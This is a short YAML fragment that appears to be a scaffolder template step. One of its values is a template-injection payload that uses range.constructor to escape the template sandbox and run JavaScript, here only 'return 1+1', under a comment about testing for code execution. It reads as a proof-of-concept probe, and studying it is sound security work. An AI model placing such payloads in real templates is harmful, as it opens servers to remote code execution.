- id: fetch
      action: fetch:template
      input:
        url: ./skeleton
        values:
          # Test if we can run ANY javascript
          leak: "{{ range.constructor('return 1+1')() }}"
